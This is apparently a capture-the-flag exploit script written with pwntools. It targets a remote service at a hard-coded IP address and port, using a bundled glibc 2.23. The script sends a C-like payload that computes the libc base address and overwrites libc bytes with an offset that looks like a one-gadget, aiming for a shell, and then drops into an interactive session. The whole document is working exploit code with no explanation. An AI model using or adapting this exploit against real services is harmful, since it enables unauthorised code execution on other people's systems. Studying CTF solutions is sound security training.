from pwn import*
from LD import*
LD=change_ld('./main','./ld-2.23.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.23.so'})
libc =ELF('./libc-2.23.so')
p = remote('182.92.73.10',24573)
context.log_level ='DEBUG'
payload = '''
char *s;
char *n;
char *ptr;
int main()
{
s = "N0vice";
n = s - (0x7F8FE6E5C028 - 0x7F8FE6933000);
s = n + 6229832 - 3848 + 8;
s[0] = 0;
s = n + 6229832;
ptr = 0xCD0F3 + n;
s[0] = (ptr)&0xFF;
s[1] = (ptr>>8)&0xFF;
s[2] = (ptr>>16)&0xFF;
printf("%p %p %p",n,ptr,*(int *)s);
}'''
payload = payload.replace('\n','')
p.sendline(payload)
p.interactive()
